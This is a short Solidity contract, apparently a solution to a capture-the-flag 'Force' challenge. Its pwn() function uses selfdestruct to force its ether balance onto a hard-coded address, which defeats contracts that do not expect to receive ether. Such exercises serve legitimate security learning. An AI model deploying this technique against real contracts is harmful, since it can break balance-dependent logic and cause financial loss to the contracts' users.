// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSol {
    function pwn() external {
        address _addr = 0x87d596dE6f8c1420f729Ef80293b16244daC1378;
        selfdestruct(payable(_addr));
    }

    receive() external payable {
        
    }
}